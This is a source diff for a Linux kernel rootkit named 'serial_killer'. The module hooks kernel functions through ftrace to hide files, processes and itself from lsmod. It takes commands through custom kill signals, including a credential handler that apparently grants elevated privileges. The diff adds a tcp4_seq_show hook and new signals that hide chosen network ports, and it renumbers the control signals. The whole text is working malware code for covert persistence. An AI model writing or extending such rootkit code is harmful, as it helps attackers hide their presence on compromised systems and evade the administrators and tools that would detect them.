@@ -44,7 +44,8 @@ static struct ftrace_hook hooks[] = {
     HOOK("random_read", hook_random_read, &orig_random_read),
     HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)
 };
 
 static int credential_handler_wrapper(int sig, pid_t pid){
@@ -66,17 +67,18 @@ static int presence_handler_wrapper(int sig, pid_t pid) {
 
     int err;
     switch (sig) {
-        case 61:
+        case 41:
             if (pid == 0 && is_hidden == 0) {
                 printk(KERN_ERR "serial_killer: Already Exposed!\n");
             } else if (pid == 0 && is_hidden == 1) {
-                printk(KERN_INFO "serial_killer: Exposing all dirs, pid and myself...\n");
+                printk(KERN_INFO "serial_killer: Exposing all dirs, pid, ports and myself...\n");
                 fh_remove_hook(&hooks[3]);  
                 fh_remove_hook(&hooks[4]);
+                fh_remove_hook(&hooks[5]);
                 show_lsmod();
                 is_hidden = 0;
             } else if (pid == 1 && is_hidden == 0) {
-                printk(KERN_INFO "serial_killer: Hiding all dirs, pid and myself...\n");
+                printk(KERN_INFO "serial_killer: Hiding all dirs, pid, ports and myself...\n");
                 err = fh_install_hook(&hooks[3]);
                 if (err) {
                     printk(KERN_DEBUG "install hook_getdents64 err value: %d\n", err);
@@ -88,6 +90,13 @@ static int presence_handler_wrapper(int sig, pid_t pid) {
                     fh_remove_hook(&hooks[3]);
                     return err;
                 }
+                err = fh_install_hook(&hooks[5]);
+                if (err) {
+                    printk(KERN_DEBUG "install hook_tcp4_seq_show err value: %d\n", err);
+                    fh_remove_hook(&hooks[3]);
+                    fh_remove_hook(&hooks[4]);
+                    return err;
+                }
                 hide_lsmod(); 
                 is_hidden = 1;
             } else if (pid == 1 && is_hidden == 1) {
@@ -97,14 +106,25 @@ static int presence_handler_wrapper(int sig, pid_t pid) {
             }
         return 0;
 
-        case 62:
+        case 42:
             add_hidden_process(pid);
             printk_hidden_processes();
             return 0;
         
-        case 63:
+        case 43:
             remove_hidden_process(pid);
             printk_hidden_processes();
+            return 0;
+        
+        case 44:
+            add_hidden_port(pid);
+            printk_hidden_ports();
+            return 0;
+
+        case 45:
+            remove_hidden_port(pid);
+            printk_hidden_ports();
+            return 0;
     }
     return 0;
 }
@@ -156,7 +176,7 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
     switch (sig) {
 
          // Credentials Handler
-        case 60: 
+        case 40: 
             err = credential_handler_wrapper(sig, pid);
             if (err) {
                 return orig_kill(regs);
@@ -164,9 +184,11 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
             return 0;
 
         // Presence Handler
-        case 61:
-        case 62:
-        case 63:
+        case 41:
+        case 42:
+        case 43:
+        case 44:
+        case 45:
             err = presence_handler_wrapper(sig, pid);
             if (err) {
                 return orig_kill(regs);
